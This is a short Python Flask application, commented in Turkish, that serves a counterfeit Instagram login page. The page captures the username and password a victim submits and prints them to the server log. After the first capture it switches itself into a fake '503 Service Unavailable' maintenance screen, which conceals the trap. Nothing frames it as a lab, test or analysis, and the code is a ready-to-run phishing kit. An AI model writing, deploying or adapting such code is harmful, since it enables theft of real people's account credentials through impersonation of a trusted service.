
    import os
from flask import Flask, request, render_template_string

app = Flask(__name__)

# Bu değişken şifre girilip girilmediğini tutar
SISTEM_ACIK = True

HTML_KODU = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giriş Yap • Instagram</title>
    <style>
        body { font-family: sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; box-sizing: border-box; }
        .insta-text { font-size: 35px; font-weight: bold; margin-bottom: 30px; font-style: italic; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; box-sizing: border-box; }
        button { width: 100%; padding: 8px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="box">
        <div class="insta-text">Instagram</div>
        <form method="POST" action="/login">
            <input type="text" name="u" placeholder="Kullanıcı adı" required>
            <input type="password" name="p" placeholder="Şifre" required>
            <button type="submit">Giriş Yap</button>
        </form>
    </div>
</body>
</html>
"""

HATA_EKRANI = "<h1>503 Service Unavailable</h1><p>Sunucu bakimda.</p>"

@app.route('/')
def home():
    global SISTEM_ACIK
    # Eğer birisi daha önce giriş yaptıysa siteyi kapat
    if not SISTEM_ACIK:
        return HATA_EKRANI, 503
    return render_template_string(HTML_KODU)

@app.route('/login', methods=['POST'])
def login():
    global SISTEM_ACIK
    # Bilgileri ekrana yazdır
    print(f"VERI: {request.form.get('u')} - {request.form.get('p')}")
    
    # ŞİMDİ SİSTEMİ KAPATIYORUZ (İmha modu)
    SISTEM_ACIK = False
    
    return HATA_EKRANI, 503

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
